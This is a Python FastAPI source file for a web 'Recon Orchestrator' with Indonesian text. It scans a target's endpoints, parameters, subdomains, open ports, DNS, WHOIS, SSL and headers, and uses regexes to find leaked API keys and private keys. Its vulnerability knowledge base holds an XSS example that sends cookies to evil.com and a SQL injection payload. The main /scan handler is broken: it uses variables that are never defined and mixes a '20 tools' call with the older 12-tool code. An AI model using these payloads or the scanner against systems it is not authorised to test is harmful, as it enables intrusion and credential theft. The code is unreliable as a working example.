from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import subprocess, json, os, re, time, socket, ssl
import urllib.request, urllib.parse
from bs4 import BeautifulSoup
import tools as T
import concurrent.futures

app = FastAPI(title="Recon Orchestrator", version="3.0.0")

class ScanRequest(BaseModel):
    target: str

# ============================================
# VULN KNOWLEDGE BASE
# ============================================
VULN_DB = {
    "xss": {
        "name": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "attacker": "Attacker menyisipkan script berbahaya (contoh: <script>document.location='https://evil.com/?c='+document.cookie</script>) ke input yang tidak di-sanitize. Ketika korban membuka halaman, script jalan di browser korban, cookie/session dicuri, atau diarahkan ke situs palsu untuk phishing.",
        "fix": "Encode output (HTML entity), validasi input, Content-Security-Policy header, HttpOnly cookie."
    },
    "sqli": {
        "name": "SQL Injection",
        "severity": "Critical",
        "attacker": "Attacker memasukkan payload SQL (contoh: ' OR '1'='1) ke input form. Query SQL jadi termanipulasi, attacker bisa dump seluruh database (user, password, data kartu kredit), atau bahkan hapus tabel.",
        "fix": "Prepared statement / parameterized query, validasi input, least privilege DB user."
    },
    "idor": {
        "name": "Insecure Direct Object Reference",
        "severity": "High",
        "attacker": "Attacker mengubah ID di URL (contoh: /user/123 → /user/124) karena server tidak cek otorisasi. Attacker bisa lihat/edit data user lain, termasuk admin.",
        "fix": "Authorization check di server, pakai UUID bukan sequential ID, session-based access."
    },
    "csrf": {
        "name": "Cross-Site Request Forgery",
        "severity": "High",
        "attacker": "Attacker membuat halaman jahat yang otomatis submit form ke web target (contoh: transfer uang). Karena korban sudah login, browser kirim cookie otomatis, server kira itu request sah.",
        "fix": "CSRF token di form, SameSite=Strict cookie, validasi Origin/Referer header."
    },
    "open_redirect": {
        "name": "Open Redirect",
        "severity": "Medium",
        "attacker": "Attacker memanipulasi parameter redirect (contoh: ?next=https://evil.com). Korban dikira diarahkan ke web resmi, ternyata ke situs phishing yang mirip.",
        "fix": "Whitelist domain redirect, validasi URL, konfirmasi ke user."
    },
    "info_disclosure": {
        "name": "Information Disclosure",
        "severity": "Medium",
        "attacker": "Attacker menemukan file sensitif (.env, .git, backup, phpinfo). Dari situ dapat DB password, API key, atau struktur internal sistem untuk serangan lanjutan.",
        "fix": "Block akses file sensitif di server config, hapus file backup, disable directory listing."
    },
    "missing_headers": {
        "name": "Missing Security Headers",
        "severity": "Medium",
        "attacker": "Tanpa CSP, X-Frame-Options, HSTS, attacker bisa lakuin clickjacking (iframe tersembunyi), XSS lebih mudah, atau downgrade HTTPS ke HTTP (MITM).",
        "fix": "Tambah header: Content-Security-Policy, X-Frame-Options, HSTS, X-Content-Type-Options, Referrer-Policy."
    },
    "subdomain_takeover": {
        "name": "Potential Subdomain Takeover",
        "severity": "High",
        "attacker": "Subdomain (contoh: blog.target.com) mengarah ke layanan (Heroku/Vercel/GitHub) yang sudah tidak aktif. Attacker klaim layanan itu, dapat kontrol subdomain, bisa phishing di domain target.",
        "fix": "Hapus DNS record yang tidak terpakai, monitor subdomain aktif, verifikasi ownership."
    },
    "exposed_port": {
        "name": "Exposed Service Port",
        "severity": "Medium",
        "attacker": "Port non-standar (3306 MySQL, 6379 Redis, 27017 MongoDB, 9200 Elasticsearch) terbuka ke internet. Attacker bisa akses langsung DB tanpa auth default, dump data.",
        "fix": "Tutup port ke publik (firewall), bind ke localhost, tambah auth + TLS."
    }
}

# ============================================
# HELPERS
# ============================================
def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Recon/3.0)"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8", errors="ignore"), r.status, dict(r.headers)
    except Exception as e:
        return None, 0, {"error": str(e)}

# ============================================
# TOOL 1: ENDPOINT EXTRACTOR
# ============================================
def extract_endpoints(html, base):
    eps = set()
    soup = BeautifulSoup(html, "html.parser")
    for tag in soup.find_all(["a", "link", "script", "img", "form", "iframe"]):
        attr = tag.get("href") or tag.get("src") or tag.get("action")
        if attr:
            full = urllib.parse.urljoin(base, attr)
            if base.split("/")[2] in full: eps.add(full)
    for m in re.findall(r'["\'](/[a-zA-Z0-9_\-/]+)["\']', html):
        eps.add(base.rsplit("/",1)[0] + m)
    for m in re.findall(r'["\'](/api/[^"\']+)["\']', html):
        eps.add(base.rsplit("/",1)[0] + m)
    return sorted(eps)[:200]

# ============================================
# TOOL 2: PARAMETER DISCOVERY
# ============================================
def extract_params(urls):
    params = set()
    for u in urls:
        parsed = urllib.parse.urlparse(u)
        if parsed.query:
            for k,v in urllib.parse.parse_qsl(parsed.query): params.add(k)
    return sorted(params)

def extract_forms(html):
    forms = []
    soup = BeautifulSoup(html, "html.parser")
    for f in soup.find_all("form"):
        forms.append({
            "action": f.get("action",""),
            "method": f.get("method","GET").upper(),
            "inputs": [i.get("name") for i in f.find_all("input") if i.get("name")]
        })
    return forms[:20]

# ============================================
# TOOL 3: SECURITY HEADERS
# ============================================
def security_headers(headers):
    required = ["content-security-policy","x-frame-options","x-content-type-options",
                "strict-transport-security","referrer-policy","permissions-policy"]
    lower = [k.lower() for k in headers.keys()]
    missing = [h for h in required if h not in lower]
    vulns = []
    if missing: vulns.append({"type":"missing_headers","missing":missing,**VULN_DB["missing_headers"]})
    return {"missing": missing, "present": [h for h in required if h not in missing], "vulnerabilities": vulns}

# ============================================
# TOOL 4: SUBDOMAIN ENUM (crt.sh)
# ============================================
def subdomain_enum(domain):
    try:
        url = f"https://crt.sh/?q=%.{domain}&output=json"
        req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=20) as r:
            data = json.loads(r.read().decode("utf-8", errors="ignore"))
        subs = set()
        for e in data:
            for n in e.get("name_value","").split("\n"):
                n = n.strip().lower()
                if n and "*" not in n: subs.add(n)
        return sorted(subs)[:200]
    except Exception as e:
        return {"error": str(e)}

# ============================================
# TOOL 5: TECH DETECTION
# ============================================
def detect_tech(html, headers):
    tech = []
    if headers.get("Server"): tech.append({"category":"server","name":headers["Server"]})
    if headers.get("X-Powered-By"): tech.append({"category":"backend","name":headers["X-Powered-By"]})
    lower = html.lower()
    sigs = {"react":"React","next.js":"Next.js","vue":"Vue","angular":"Angular",
            "jquery":"jQuery","bootstrap":"Bootstrap","tailwind":"TailwindCSS",
            "wordpress":"WordPress","wp-content":"WordPress","shopify":"Shopify",
            "cloudflare":"Cloudflare","google-analytics":"GA","gtag":"GTM",
            "hotjar":"Hotjar","sentry":"Sentry","stripe":"Stripe",
            "recaptcha":"reCAPTCHA","laravel":"Laravel","django":"Django",
            "firebase":"Firebase","supabase":"Supabase","vercel":"Vercel",
            "netlify":"Netlify","pages.dev":"CF Pages","github.io":"GH Pages"}
    for sig,name in sigs.items():
        if sig in lower: tech.append({"category":"framework/service","name":name})
    return tech

# ============================================
# TOOL 6: PORT SCAN (common ports)
# ============================================
def port_scan(host, timeout=1):
    common = [21,22,23,25,53,80,110,143,443,445,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,8888,9200,27017]
    exposed = []
    def check(p):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            r = s.connect_ex((host, p))
            s.close()
            return p if r == 0 else None
        except: return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        for res in ex.map(check, common):
            if res: exposed.append(res)
    vulns = []
    risky = {3306:"MySQL",6379:"Redis",27017:"MongoDB",9200:"Elasticsearch",5432:"PostgreSQL",1433:"MSSQL",3389:"RDP"}
    for p in exposed:
        if p in risky:
            vulns.append({"type":"exposed_port","port":p,"service":risky[p],**VULN_DB["exposed_port"]})
    return {"exposed": exposed, "vulnerabilities": vulns}

# ============================================
# TOOL 7: DNS RECORDS
# ============================================
def dns_lookup(domain):
    records = {}
    types = ["A","AAAA","MX","NS","TXT","CNAME"]
    for t in types:
        try:
            out = subprocess.run(["nslookup","-type="+t,domain], capture_output=True, text=True, timeout=5)
            if out.returncode == 0 and "Address" in out.stdout or "mail exchanger" in out.stdout:
                records[t] = [l.strip() for l in out.stdout.split("\n") if l.strip() and not l.startswith("Server") and "Non-authoritative" not in l][:5]
        except: pass
    return records

# ============================================
# TOOL 8: WHOIS
# ============================================
def whois_lookup(domain):
    try:
        out = subprocess.run(["whois",domain], capture_output=True, text=True, timeout=10)
        if out.returncode != 0: return {"error":"whois failed"}
        lines = out.stdout.split("\n")
        info = {}
        for line in lines:
            if ":" in line:
                k,_,v = line.partition(":")
                k = k.strip().lower()
                if k in ["registrar","creation date","registry expiry date","expiry date","name server","registrant organization"]:
                    info[k] = v.strip()
        return info if info else {"error":"no whois data"}
    except Exception as e:
        return {"error": str(e)}

# ============================================
# TOOL 9: ROBOTS.TXT + SITEMAP
# ============================================
def robots_sitemap(base):
    result = {}
    for path in ["robots.txt","sitemap.xml"]:
        html,status,_ = fetch(base + "/" + path, timeout=5)
        if html: result[path] = {"status":status,"content":html[:2000]}
    return result

# ============================================
# TOOL 10: SSL INFO
# ============================================
def ssl_info(host):
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host,443), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                return {
                    "issuer": dict(x[0] for x in cert.get("issuer",[])),
                    "subject": dict(x[0] for x in cert.get("subject",[])),
                    "expires": cert.get("notAfter"),
                    "version": ssock.version()
                }
    except Exception as e:
        return {"error": str(e)}

# ============================================
# TOOL 11: JS SECRET SCANNER
# ============================================
def scan_secrets(html):
    secrets = []
    patterns = {
        "AWS Key": r"AKIA[0-9A-Z]{16}",
        "Google API": r"AIza[0-9A-Za-z\-_]{35}",
        "GitHub Token": r"gh[pousr]_[A-Za-z0-9]{36}",
        "Stripe Key": r"sk_live_[0-9a-zA-Z]{24}",
        "JWT": r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+",
        "Private Key": r"-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----"
    }
    for name,pat in patterns.items():
        matches = re.findall(pat, html)
        for m in matches[:3]:
            secrets.append({"type":name,"value":m[:50]+"..."})
    return secrets

# ============================================
# TOOL 12: OPEN REDIRECT CHECK
# ============================================
def check_open_redirect(html, base):
    redirects = []
    soup = BeautifulSoup(html,"html.parser")
    for a in soup.find_all("a", href=True):
        href = a["href"]
        if any(k in href.lower() for k in ["redirect","url=","next=","return=","continue=","dest="]):
            redirects.append(href)
    vulns = []
    if redirects:
        vulns.append({"type":"open_redirect","candidates":redirects[:5],**VULN_DB["open_redirect"]})
    return {"candidates":redirects[:20],"vulnerabilities":vulns}

# ============================================
# ORCHESTRATOR
# ============================================
@app.get("/", response_class=HTMLResponse)
def home():
    return """<!DOCTYPE html>
<html><head><title>Recon Orchestrator</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:-apple-system,sans-serif;max-width:900px;margin:20px auto;padding:16px;background:#FDF6E3;color:#0A0A0A}
h1{font-weight:900}
input,button{font-size:16px;padding:12px;border:3px solid #0A0A0A;border-radius:12px;width:100%;box-sizing:border-box;margin:8px 0;background:#fff}
button{background:#FF3B5C;color:#fff;font-weight:800;cursor:pointer}
pre{background:#fff;border:3px solid #0A0A0A;border-radius:12px;padding:16px;overflow:auto;font-size:12px}
.card{background:#fff;border:3px solid #0A0A0A;border-radius:12px;padding:16px;margin:12px 0}
.vuln{background:#FFE5E5;border-left:6px solid #FF3B5C;padding:12px;margin:8px 0;border-radius:8px}
.vuln h3{margin:0 0 8px 0;color:#C00}
.vuln p{margin:4px 0;font-size:13px;line-height:1.5}
.sev-High{color:#E76F51}.sev-Critical{color:#C00;font-weight:900}.sev-Medium{color:#F4A261}
</style></head><body>
<h1>🔍 Recon Orchestrator v3</h1>
<p><strong>12 tools</strong>: endpoint, parameter, header, subdomain, tech, port, DNS, WHOIS, robots, SSL, secret, redirect.</p>
<p style="color:#C00"><strong>⚠️ Gunakan hanya untuk web milik sendiri.</strong></p>
<input id="t" placeholder="https://web-lu.com" />
<button onclick="go()">Scan</button>
<div id="out"></div>
<script>
async function go(){
  const t = document.getElementById('t').value.trim();
  if(!t){alert('Isi target');return;}
  document.getElementById('out').innerHTML='<p>⏳ Scanning...</p>';
  try{
    const r = await fetch('/scan',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target:t})});
    const j = await r.json();
    if(!j.ok){document.getElementById('out').innerHTML='<pre>'+JSON.stringify(j,null,2)+'</pre>';return;}
    let h='';
    const d=j.data;
    h+='<div class="card"><h2>📊 Summary</h2><pre>'+JSON.stringify(d.summary,null,2)+'</pre></div>';
    if(d.tools.vulnerabilities && d.tools.vulnerabilities.length){
      h+='<div class="card"><h2>🚨 Vulnerabilities</h2>';
      for(const v of d.tools.vulnerabilities){
        h+='<div class="vuln"><h3 class="sev-'+v.severity+'">['+v.severity+'] '+v.name+'</h3>';
        h+='<p><strong>Attacker:</strong> '+v.attacker+'</p>';
        h+='<p><strong>Fix:</strong> '+v.fix+'</p></div>';
      }
      h+='</div>';
    }
    for(const [k,v] of Object.entries(d.tools)){
      if(k==='vulnerabilities')continue;
      h+='<div class="card"><h3>🔧 '+k+'</h3><pre>'+JSON.stringify(v,null,2).slice(0,3000)+'</pre></div>';
    }
    document.getElementById('out').innerHTML=h;
  }catch(e){document.getElementById('out').innerHTML='<pre>ERROR: '+e.message+'</pre>';}
}
</script></body></html>"""

@app.post("/scan")
async def scan(req: ScanRequest):
    target = req.target.strip().rstrip("/")
    # Auto-prepend https:// kalau gak ada skema
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    parsed = urllib.parse.urlparse(target)
    domain = parsed.netloc
    host = domain.split(":")[0]
    result = {"target":target,"domain":domain,"scanned_at":time.strftime("%Y-%m-%d %H:%M:%S"),"tools":{},"all_vulnerabilities":[]}

    # 20 tools via tools.py
    t_res = T.run_all_20(target, host, domain)
    if "error" in t_res:
        return {"ok":False,"error":t_res["error"]}
    
    result["tools"] = t_res
    result["tools"]["http_status"] = {"status":200,"server":t_res.get("technology",[{}])[0].get("name","?") if t_res.get("technology") else "?"}
    
    sh = security_headers(headers)
    result["tools"]["security_headers"] = sh
    result["all_vulnerabilities"].extend(sh["vulnerabilities"])

    result["tools"]["technology"] = detect_tech(html,headers)
    
    eps = extract_endpoints(html,target)
    result["tools"]["endpoints"] = {"count":len(eps),"list":eps[:100]}
    
    params = extract_params(eps)
    result["tools"]["parameters"] = {"count":len(params),"list":params}
    result["tools"]["forms"] = extract_forms(html)
    
    subs = subdomain_enum(domain)
    result["tools"]["subdomains"] = subs if isinstance(subs,dict) else {"count":len(subs),"list":subs}
    
    result["tools"]["ports"] = port_scan(host)
    result["all_vulnerabilities"].extend(result["tools"]["ports"]["vulnerabilities"])
    
    result["tools"]["dns"] = dns_lookup(domain)
    result["tools"]["whois"] = whois_lookup(domain)
    result["tools"]["robots_sitemap"] = robots_sitemap(target)
    result["tools"]["ssl"] = ssl_info(host)
    result["tools"]["secrets"] = scan_secrets(html)
    
    red = check_open_redirect(html,target)
    result["tools"]["open_redirects"] = red
    result["all_vulnerabilities"].extend(red["vulnerabilities"])
    
    missing = len(sh["missing"])
    result["summary"] = {
        "total_endpoints":len(eps),"total_params":len(params),
        "total_forms":len(result["tools"]["forms"]),
        "total_subdomains":len(subs) if isinstance(subs,list) else 0,
        "exposed_ports":len(result["tools"]["ports"]["exposed"]),
        "secrets_found":len(result["tools"]["secrets"]),
        "missing_headers":missing,
        "total_vulnerabilities":len(result["all_vulnerabilities"]),
        "risk_hint":"Critical" if len(result["all_vulnerabilities"])>2 else "High" if len(result["all_vulnerabilities"])>0 else "Low"
    }
    
    return {"ok":True,"data":result}
